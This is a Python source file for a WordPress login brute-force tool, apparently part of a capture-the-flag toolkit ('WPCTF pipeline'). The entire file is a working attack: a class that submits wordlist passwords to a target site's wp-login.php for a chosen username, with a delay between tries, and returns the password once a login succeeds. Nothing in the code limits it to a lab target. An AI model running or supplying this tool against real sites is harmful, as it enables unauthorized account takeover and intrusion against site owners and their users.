import requests
import time
from typing import List, Dict, Any
from .validators import is_login_success


class WordPressBruteForceEngine:
    """
    WordPress Login Brute Force Engine (V1)

    Features:
    - Wordlist-based password guessing
    - Smart success detection
    - Lightweight and pluggable into WPCTF pipeline
    """

    def __init__(self, target_url: str, username: str = "admin", delay: float = 0.3):
        self.target_url = target_url.rstrip("/") + "/wp-login.php"
        self.username = username
        self.delay = delay
        self.session = requests.Session()

    def attack(self, passwords: List[str]) -> Dict[str, Any]:
        """
        Run brute force attack

        Returns:
            {
                "success": bool,
                "password": str | None,
                "attempts": int
            }
        """

        attempts = 0

        for password in passwords:
            attempts += 1

            payload = {
                "log": self.username,   # WordPress standard field
                "pwd": password,
                "wp-submit": "Log In"
            }

            try:
                response = self.session.post(self.target_url, data=payload, timeout=5)

                # 🔍 smart validation (not just status_code)
                if is_login_success(response):
                    return {
                        "success": True,
                        "password": password,
                        "attempts": attempts
                    }

                time.sleep(self.delay)

            except requests.RequestException:
                continue

        return {
            "success": False,
            "password": None,
            "attempts": attempts
        }